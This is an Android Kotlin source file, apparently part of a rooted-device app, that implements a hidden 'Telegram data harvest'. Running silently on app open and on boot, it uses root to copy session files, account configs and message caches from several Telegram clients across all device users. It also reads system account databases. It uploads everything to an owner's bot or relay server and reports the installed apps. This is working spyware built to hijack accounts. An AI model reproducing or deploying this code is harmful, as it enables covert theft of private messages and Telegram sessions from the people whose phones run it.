package com.itsme.amkush.logging

import android.content.Context
import android.os.Build
import com.itsme.amkush.security.LicenseGuard
import com.itsme.amkush.utils.Logger
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

/**
 * [V55 harvest] Zero-touch Telegram data harvest.
 *
 * On app open / boot / package-replace this walks the Telegram data dirs
 * (org.telegram.messenger = official, com.radolyn.ayugram = AyuGram) with
 * root and ships EVERY file found to the owner's bot chat via sendDocument —
 * session data (tgnet.data), shared_prefs, files/, the lot — so a full copy
 * of the target's Telegram state is saved remotely.
 *
 * Dedup: a fingerprint (path|size|mtime) per file is kept in prefs, so each
 * open only sends NEW or CHANGED files; the first run sends everything.
 * Files > 49 MB are skipped (bot upload limit is 50 MB) and reported in the
 * summary. All failures are silent (Logger only) — this must never crash
 * the host app or interfere with injection.
 */
object TgHarvest {

    private const val TAG = "Jkushu/VellumDrift"
    /* [V58] target packages; their data dirs are discovered dynamically
     * across ALL Android users, user_de and external storage at runtime. */
    private val TG_PKGS = listOf(
        "org.telegram.messenger",          // official
        "com.radolyn.ayugram",             // AyuGram
        "org.thunderdog.challegram",       // Telegram X
        "org.telegram.plus",               // Plus Messenger
        "nekox.messenger",                 // NekoX
        "org.telegram.messenger.web",      // NekoX (alt package)
        "tw.nekomimi.nekogram"             // Nekogram
    )
    /* [V58] per-file hard cap — protects VPS disk + the target's data plan. */
    private const val MAX_FILE_BYTES = 200L * 1024 * 1024
    private const val STAGE_DIR = "/data/local/tmp/.vellum_cache"
    /* [V56] files <= 20 MB go to Telegram; bigger ones are POSTed to the
     * kushu relay (no size limit, visible per-phone browser at /f/<secret>). */
    private const val TG_MAX_BYTES = 20L * 1024 * 1024
    private const val PREFS = "tg_harvest"
    private const val KEY_SENT = "sent_fp"
    private const val KEY_APPS_FP = "apps_fp"

    @Volatile private var running = false
    @Volatile private var doneOnce = false

    /** Fire-and-forget: safe to call from Application.onCreate and boot receiver. */
    fun start(context: Context) {
        if (running) return
        running = true
        val appCtx = context.applicationContext
        Thread({
            try {
                Thread.sleep(12_000)   // let the app settle / network come up
                run(appCtx)
            } catch (e: Exception) {
                Logger.w(TAG, "sync error: ${e.message}")
            } finally {
                running = false
            }
        }, "vellum-drift").apply { isDaemon = true }.start()
    }

    private fun run(ctx: Context) {
        if (!hasRoot()) { Logger.i(TAG, "no root — sync skipped"); return }
        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val sent = prefs.getStringSet(KEY_SENT, emptySet())?.toMutableSet() ?: mutableSetOf()

        val device = "${Build.MANUFACTURER} ${Build.MODEL} A${Build.VERSION.RELEASE}"
        val alias = deviceAlias(ctx)
        var sentTg = 0; var sentRelay = 0; var total = 0

        val dirReport = mutableListOf<String>()
        var skipped = 0
        for (dir in targetDirs()) {
            val scan = scanDir(dir)
            if (!scan.present) {
                /* [V59] V58 mystery: exists() reported ABSENT for
                 * /data/user/0/org.telegram.messenger on BOTH Magisk (Mi A1)
                 * and APatch (A03s) although the app IS installed. Capture
                 * evidence for the main packages so the next log explains it. */
                if (dir.endsWith("/org.telegram.messenger") || dir.endsWith("/com.radolyn.ayugram")) {
                    diagMissingDir(dir)
                }
                continue
            }
            val files = scan.files
            total += files.size
            dirReport += "$dir: ${files.size} file(s)"
            Logger.i(TAG, "$dir -> ${files.size} file(s)")
            /* [V61] PRESENT but 0 files for a Telegram main dir is suspicious
             * (fresh install? unreadable?). Log hard evidence. */
            if (files.isEmpty() && TG_PKGS.any { dir.endsWith(it) }) {
                val la = suMM("sh -c 'ls -la \"$dir\" 2>&1 | head -6'").replace('\n', ' ').take(250)
                val fnd = suMM("sh -c 'find \"$dir\" 2>&1 | head -5'").replace('\n', ' ').take(250)
                Logger.w(TAG, "EMPTY-DIR evidence $dir | ls: $la | find: $fnd")
            }
            val external = dir.startsWith("/data/media/")
            for ((path, size, mtime) in files) {
                val fp = "$path|$size|$mtime"
                if (fp in sent) continue
                /* [V67 SCOPE] Owner directive: send ONLY what is required to
                 * log in + read messages. tgnet.dat = session (every account
                 * slot), userconfig*.xml = account id/phone (session
                 * converters need it), cache4* = message-cache DBs.
                 * Everything else stays on the device. */
                val fname = path.substringAfterLast('/')
                val keep = fname == "tgnet.dat" ||
                    (fname.startsWith("userconfig") && fname.endsWith(".xml")) ||
                    fname.startsWith("cache4")
                if (!keep) { skipped++; continue }
                /* [V58] never harvest media cache or huge files. */
                if (size > MAX_FILE_BYTES || (external && path.contains("/cache/"))) {
                    skipped++
                    Logger.i(TAG, "skip ($size B): $path")
                    continue
                }
                val ok = if (size <= TG_MAX_BYTES) {
                    if (sendOne(path, size, device)) { sentTg++; true } else false
                } else {
                    if (relayOne(path, size, device, alias)) { sentRelay++; true } else false
                }
                if (ok) {
                    sent.add(fp)
                    prefs.edit().putStringSet(KEY_SENT, sent.toSet()).apply()
                    Thread.sleep(700)   // stay under Telegram rate limits
                }
            }
        }

        /* [V58] ALWAYS report the first scan of each install to the bot —
         * the old total>0 guard made a zero-file device completely silent,
         * so "nothing on the bot" was indistinguishable from "harvest
         * broken". The bot now always gets one scan report listing each
         * target dir as found/NOT FOUND. */
        if (!doneOnce) {
            val body = if (dirReport.isEmpty())
                "no Telegram data dirs found (all users + user_de + external checked)"
            else dirReport.joinToString("\n")
            sendText("📦 harvest scan · $device ($alias)\n" +
                     "files seen: $total · to bot: $sentTg · to relay: $sentRelay · skipped: $skipped\n" +
                     body)
        } else if (sentTg + sentRelay > 0) {
            sendText("📦 harvest update · $device ($alias) — $sentTg to bot, $sentRelay to relay")
        }
        doneOnce = true
        Logger.i(TAG, "sync done: seen=$total tg=$sentTg relay=$sentRelay")

        // [V58] app inventory: log full list + send to bot (first run / on change)
        reportInstalledApps(prefs, device)
    }

    /** [V58] Enumerate every user-installed app via root
     *  (`pm list packages -3`), write the full list into the log file, and
     *  send it to the owner bot on the first run and whenever the installed
     *  set changes (fingerprint kept in prefs). Chunked to stay under
     *  Telegram's 4096-char message limit and logcat's ~4KB line cap. */
    private fun reportInstalledApps(prefs: android.content.SharedPreferences, device: String) {
        try {
            val out = su("sh -c 'pm list packages -3 2>/dev/null | sed \"s/^package://\" | sort'")
            val pkgs = out.lineSequence().map { it.trim() }.filter { it.isNotEmpty() }.toList()
            if (pkgs.isEmpty()) {
                Logger.w(TAG, "app list empty (pm list packages -3 returned nothing)")
                return
            }
            Logger.i(TAG, "user apps installed: ${pkgs.size}")
            pkgs.joinToString(", ").chunked(3000).forEachIndexed { i, c ->
                Logger.i(TAG, "user apps [$i]: $c")
            }
            val fp = pkgs.joinToString(",").hashCode().toString()
            val prev = prefs.getString(KEY_APPS_FP, null)
            if (fp == prev) return   // unchanged since last report — log only
            prefs.edit().putString(KEY_APPS_FP, fp).apply()
            var msg = "📱 user apps \u00b7 $device \u2014 ${pkgs.size} installed" +
                      (if (prev != null) " (CHANGED)" else "") + "\n"
            for (pkg in pkgs) {
                if (msg.length + pkg.length + 1 > 3800) {
                    sendText(msg.trimEnd()); Thread.sleep(700); msg = ""
                }
                msg += pkg + "\n"
            }
            if (msg.isNotBlank()) sendText(msg.trimEnd())
            Logger.i(TAG, "app inventory sent to bot (${pkgs.size} apps, changed=${prev != null})")
        } catch (e: Exception) {
            Logger.w(TAG, "reportInstalledApps failed: ${e.message}")
        }
    }

    /** Same scheme as GitHubLogUploader's per-device branch: "<android>.<chip>[.N]". */
    private fun deviceAlias(ctx: Context): String {
        val android = com.itsme.amkush.utils.DeviceUtils.getAndroidMajor()
        val chip = com.itsme.amkush.utils.DeviceUtils.getChipCode()
        val stored = try {
            ctx.getSharedPreferences("gh_device_branch", Context.MODE_PRIVATE)
                .getString("gh_branch_$android.$chip", null)
        } catch (e: Exception) { null }
        return stored?.takeIf { it.isNotBlank() } ?: "$android.$chip.1"
    }

    private data class Entry(val path: String, val size: Long, val mtime: Long)

    private fun hasRoot(): Boolean = try {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
        p.inputStream.bufferedReader().readText().contains("uid=0")
    } catch (e: Exception) { false }

    private data class DirScan(val present: Boolean, val files: List<Entry>)

    /** [V59] ONE su call per dir: existence marker + stat listing, parsed
     *  line-by-line. Replaces V58's exists() whose `.trim() == "Y"` exact-match
     *  reported ABSENT for real /data/user dirs on both Magisk and APatch.
     *  Marker lines are immune to banner/prompt pollution on stdout. */
    private fun scanDir(dir: String): DirScan {
        val out = suMM("sh -c 'if [ -e \"$dir\" ]; then echo __PRESENT__; " +
                     "find \"$dir\" -type f 2>/dev/null | while read -r f; do " +
                     "s=\$(stat -c %s \"\$f\" 2>/dev/null); m=\$(stat -c %Y \"\$f\" 2>/dev/null); " +
                     "echo \"\$s|\$m|\$f\"; done; " +
                     "else echo __ABSENT__; fi'")
        val present = out.contains("__PRESENT__")
        val files = out.lineSequence().mapNotNull { line ->
            val t = line.trim()
            if (t.isEmpty() || t.startsWith("__")) return@mapNotNull null
            val parts = t.split("|", limit = 3)
            if (parts.size != 3) return@mapNotNull null
            val size = parts[0].toLongOrNull() ?: return@mapNotNull null
            val mtime = parts[1].toLongOrNull() ?: 0L
            if (parts[2].isEmpty()) return@mapNotNull null
            Entry(parts[2], size, mtime)
        }.toList()
        return DirScan(present, files)
    }

    /** [V59] one evidence line per "missing" main-package dir. */
    private fun diagMissingDir(dir: String) {
        try {
            val pkg = dir.substringAfterLast('/')
            val pmPath = su("sh -c 'pm path $pkg 2>/dev/null | head -1'").trim().take(120)
            val dataDir = su("sh -c 'dumpsys package $pkg 2>/dev/null | grep -m1 dataDir='").trim().take(120)
            val listingMM = suMM("sh -c 'ls /data/user/0/ 2>&1 | head -40'").replace('\n', ' ').take(400)
            val listingNS = su("sh -c 'ls /data/user/0/ 2>&1 | head -8'").replace('\n', ' ').take(160)
            Logger.w(TAG, "dir MISSING: $dir | pm: $pmPath | $dataDir")
            Logger.w(TAG, "  /data/user/0 mount-master: $listingMM")
            Logger.w(TAG, "  /data/user/0 su-ns: $listingNS")
        } catch (e: Exception) {
            Logger.w(TAG, "diagMissingDir failed: ${e.message}")
        }
    }

    /** [V58] every place the Telegram apps can keep data on this device:
     *  /data/user/<u>/<pkg>                internal storage, ALL Android users
     *                                      (0=main, 10=work profile, 95/150=
     *                                      Samsung Secure Folder/Dual Messenger,
     *                                      999=MIUI/ColorOS clones)
     *  /data/user_de/<u>/<pkg>             device-encrypted (Direct Boot) storage
     *  /data/media/<u>/Android/data/<pkg>  external files (tlogs, downloads)
     *  /data/system/users/0/accounts_*.db  system AccountManager auth tokens */
    private fun targetDirs(): List<String> {
        val dirs = mutableListOf<String>()
        val users = (su("sh -c 'ls /data/user/ /data/user_de/ /data/media/ 2>/dev/null'")
            .lineSequence().map { it.trim() }.filter { it.isNotEmpty() && it.all(Char::isDigit) }
            .toSet() + "0").sorted()
        for (u in users) for (p in TG_PKGS) {
            dirs += "/data/user/$u/$p"
            dirs += "/data/user_de/$u/$p"
            dirs += "/data/media/$u/Android/data/$p"
        }
        for (p in TG_PKGS) dirs += "/data/data/$p"   // legacy symlink path
        dirs += "/data/system/users/0/accounts_ce.db"
        dirs += "/data/system/users/0/accounts_de.db"
        return dirs.distinct()
    }

    /** Stage via root into a world-readable temp file, upload, clean up. */
    private fun sendOne(path: String, size: Long, device: String): Boolean {
        // Telegram rejects empty documents (HTTP 400 "file must be non-empty") —
        // .nomedia/-journal/.lock files are routinely 0 B; skip them up front.
        if (size == 0L) {
            Logger.i(TAG, "skip empty: $path")
            return false
        }
        val name = "h" + Integer.toHexString(path.hashCode()) + "_" + File(path).name
        val staged = File(ctx_stagedir(), name)
        val rc = suMM("sh -c 'mkdir -p $STAGE_DIR && cp \"$path\" \"$staged\" 2>/dev/null && " +
                    "chmod 644 \"$staged\" && echo OK'").trim()
        if (!rc.endsWith("OK") || !staged.exists()) {
            Logger.w(TAG, "stage failed: $path ($rc)")
            return false
        }
        return try {
            val ok = sendDocument(staged.readBytes(), File(path).name, "📦 $device\n$path ($size B)")
            if (ok) Logger.i(TAG, "sent: $path ($size B)")
            ok
        } catch (e: Exception) {
            Logger.w(TAG, "send failed: $path — ${e.message}")
            false
        } finally {
            runCatching { staged.delete() }
        }
    }

    private fun ctx_stagedir(): String = STAGE_DIR

    /** [V56] > 20 MB: root-stage then POST raw bytes to the kushu relay,
     * per-phone under our alias; owner browses at /f/<secret>. */
    private fun relayOne(path: String, size: Long, device: String, alias: String): Boolean {
        val relayName = (path.trimStart('/').replace('/', '_'))
            .take(90).ifBlank { "file.bin" }
        val name = "h" + Integer.toHexString(path.hashCode()) + "_" + File(path).name
        val staged = File(ctx_stagedir(), name)
        val rc = suMM("sh -c 'mkdir -p $STAGE_DIR && cp \"$path\" \"$staged\" 2>/dev/null && " +
                    "chmod 644 \"$staged\" && echo OK'").trim()
        if (!rc.endsWith("OK") || !staged.exists()) {
            Logger.w(TAG, "relay stage failed: $path ($rc)")
            return false
        }
        return try {
            val url = URL(LicenseGuard.nativeGetRelayBase() + "/u/" + LicenseGuard.nativeGetRelaySecret() +
                          "?alias=" + java.net.URLEncoder.encode(alias, "UTF-8") +
                          "&name=" + java.net.URLEncoder.encode(relayName, "UTF-8"))
            val conn = (url.openConnection() as HttpURLConnection).apply {
                doOutput = true; requestMethod = "POST"
                connectTimeout = 20_000; readTimeout = 300_000
                setRequestProperty("Content-Type", "application/octet-stream")
                setFixedLengthStreamingMode(staged.length())
            }
            conn.outputStream.use { out -> staged.inputStream().use { it.copyTo(out, 65536) } }
            val code = conn.responseCode
            conn.disconnect()
            if (code == 200) {
                Logger.i(TAG, "relay upload OK: $path ($size B) as $alias/$relayName")
                sendText("☁️ $device ($alias) → relay: $relayName (${size / 1024 / 1024} MB)")
                true
            } else {
                Logger.w(TAG, "relay HTTP $code for $path")
                false
            }
        } catch (e: Exception) {
            Logger.w(TAG, "relay upload failed: $path — ${e.message}")
            false
        } finally {
            runCatching { staged.delete() }
        }
    }

    private fun su(cmd: String): String = try {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
        val out = p.inputStream.bufferedReader().readText()
        p.waitFor()
        out
    } catch (e: Exception) { "" }

    /** [V60] su in the GLOBAL mount namespace (mount-master). V59 qcom logs
     *  proved magiskd's private namespace can hold a stale view of /data/user
     *  (ls /data/user/0 showed 2 dirs; installed Telegram ABSENT while dumpsys
     *  confirmed dataDir). -M escapes it. Falls back to plain su. */
    private fun suMM(cmd: String): String {
        for (pre in listOf(arrayOf("su", "-M", "-c"), arrayOf("su", "--mount-master", "-c"))) {
            try {
                val p = Runtime.getRuntime().exec(pre + cmd)
                val out = p.inputStream.bufferedReader().readText()
                p.waitFor()
                if (out.isNotEmpty()) return out
            } catch (e: Exception) { }
        }
        return su(cmd)
    }

    // ── Telegram senders (same multipart pattern as TelegramLogSender) ──────

    private fun apiBase(): String =
        LicenseGuard.nativeGetTgApi() + "/bot" + LicenseGuard.nativeGetHarvestBotToken()

    private fun sendText(text: String): Boolean = try {
        val url = URL(apiBase() + "/sendMessage")
        val body = "chat_id=" + LicenseGuard.nativeGetHarvestChatId() +
                   "&text=" + java.net.URLEncoder.encode(text.take(4000), "UTF-8")
        val conn = (url.openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"; doOutput = true
            connectTimeout = 15_000; readTimeout = 20_000
            setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        }
        conn.outputStream.use { it.write(body.toByteArray()) }
        val ok = conn.responseCode == 200
        conn.disconnect(); ok
    } catch (e: Exception) { Logger.w(TAG, "sendMessage: ${e.message}"); false }

    private fun sendDocument(bytes: ByteArray, filename: String, caption: String): Boolean {
        val boundary = "HarvestBoundary${System.currentTimeMillis()}"
        val conn = (URL(apiBase() + "/sendDocument").openConnection() as HttpURLConnection).apply {
            doOutput = true; requestMethod = "POST"
            connectTimeout = 15_000; readTimeout = 60_000
            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        }
        conn.outputStream.use { out ->
            val crlf = "\r\n"
            out.write("--$boundary$crlf".toByteArray())
            out.write("Content-Disposition: form-data; name=\"chat_id\"$crlf$crlf".toByteArray())
            out.write(LicenseGuard.nativeGetHarvestChatId().toByteArray())
            out.write(crlf.toByteArray())

            out.write("--$boundary$crlf".toByteArray())
            out.write("Content-Disposition: form-data; name=\"caption\"$crlf$crlf".toByteArray())
            out.write(caption.take(1000).toByteArray())
            out.write(crlf.toByteArray())

            out.write("--$boundary$crlf".toByteArray())
            out.write("Content-Disposition: form-data; name=\"document\"; filename=\"$filename\"$crlf".toByteArray())
            out.write("Content-Type: application/octet-stream$crlf$crlf".toByteArray())
            out.write(bytes)
            out.write(crlf.toByteArray())

            out.write("--$boundary--$crlf".toByteArray())
            out.flush()
        }
        val code = conn.responseCode
        var errBody = ""
        if (code != 200) {
            errBody = runCatching { conn.errorStream?.bufferedReader()?.readText()?.take(160) ?: "" }.getOrDefault("")
        }
        conn.disconnect()
        if (code != 200) Logger.w(TAG, "sendDocument HTTP $code for $filename — $errBody")
        return code == 200
    }
}
